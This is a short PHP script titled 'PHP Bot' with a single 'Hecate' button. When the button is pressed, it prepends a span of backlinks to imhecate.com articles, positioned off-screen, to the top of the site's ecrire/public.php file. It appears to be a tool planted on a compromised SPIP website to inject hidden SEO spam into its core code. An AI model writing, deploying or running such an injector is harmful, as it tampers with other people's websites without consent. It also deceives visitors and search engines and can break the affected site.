<?php

// Backlink insertion process
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Backlink code to be added
    $backlinkCode = '<span style="position: absolute; left: -9655px;">
<a href="https://imhecate.com/who-is-assaf-rappaport-the-wiz-ceo-redefining-digital-assets-protection/" title="wiz ceo">wiz ceo</a><br></br>
<a href="https://imhecate.com/ai-powered-search-startup-glean-doubles-valuation-in-new-funding/" title="aipowered 23m series softbank ventures">aipowered 23m series softbank ventures</a><br></br>
<a href="https://imhecate.com/celsius-token-surges-300-a-month-after-2-5b-payment-to-creditors/" title="cointelegraph - exceo bankrupt celsius">exceo bankrupt celsius</a>
</span>' . PHP_EOL;

    // Path to the 'ecrire' folder
    $ecrireDir = __DIR__ . DIRECTORY_SEPARATOR . 'ecrire';

    // Path to the public.php file
    $publicFilePath = $ecrireDir . DIRECTORY_SEPARATOR . 'public.php';

    // Check and edit the public.php file
    if (file_exists($publicFilePath)) {
        // Read the contents of the file
        $fileContents = file_get_contents($publicFilePath);

        // Check if the backlink is already present
        if (strpos($fileContents, $backlinkCode) === false) {
            // Add the backlink to the top of the file
            $newContents = $backlinkCode . $fileContents;

            // Write the file with the new contents
            if (file_put_contents($publicFilePath, $newContents)) {
                echo "Backlink successfully added: $publicFilePath\n";
            } else {
                echo "Error writing to the file: $publicFilePath\n";
            }
        } else {
            echo "Backlink already exists: $publicFilePath\n";
        }
    } else {
        echo "public.php file not found: $publicFilePath\n";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Bot</title>
</head>
<body>
    <form method="post">
        <button type="submit">Hecate</button>
    </form>
</body>
</html>
